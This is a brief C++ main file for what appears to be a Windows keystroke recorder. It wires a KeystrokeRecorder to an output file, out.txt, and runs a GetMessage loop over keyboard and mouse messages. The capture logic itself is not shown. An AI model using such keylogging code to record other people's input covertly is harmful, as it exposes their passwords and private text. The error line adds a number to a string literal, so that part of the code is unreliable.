#include <iostream>
#include "keystroke_recorder.h"
#include "snapshot_stream.h"

#include "WinUser.h"

int main()
{
    auto snapshotStream = std::make_shared<SnapshotStream>("out.txt");

    KeystrokeRecorder keystrokeRecorder;
    keystrokeRecorder.registerRecorder(snapshotStream);

    BOOL ret;
    MSG msg;
    while ((ret = GetMessage(&msg, NULL, WM_KEYFIRST, WM_MOUSELAST)) != 0)
    {
        if (ret == -1)
        {
            throw std::runtime_error("Error retrieving message with GetMessage(), hWnd is probably an invalid window handle, or lpMsg is an invalid pointer! Error code:" + GetLastError());
        }
    }
}